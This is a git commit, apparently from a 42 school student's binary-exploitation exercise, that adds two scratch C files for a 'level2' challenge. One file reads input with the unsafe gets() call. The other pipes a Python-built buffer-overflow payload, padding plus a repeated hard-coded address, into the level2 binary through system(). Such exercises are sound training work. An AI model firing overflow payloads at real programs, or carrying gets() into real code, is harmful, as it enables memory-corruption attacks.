9e51288c0fe29eda79fdd6517c36b70ed00b1de9
Neben <bperez@student.42lyon.fr>
2023-12-11 03:36:21 +0100

    some resources of night work on level2

---
+++ level2/resources/tmp/a.c
@@ -0,0 +1,11 @@
+#include <stdio.h>
+
+int main() {
+    char* address = (void*)0x804b008;
+
+    // Print the address
+    printf("Address: %s\n", address);
+
+    return 0;
+}
+
---
+++ level2/resources/tmp/x.c
@@ -0,0 +1,12 @@
+#include <string.h>
+#include <stdio.h>
+int main()
+{
+char hello[50] = {0};
+
+gets(hello);
+char *x = strndup(hello, 50);
+printf("%p\n", x);
+system("python -c \"print(b'a'*80 + b'\x08\xb0\x04\x80' * 4)\" | ~/level2");
+return 0;
+}
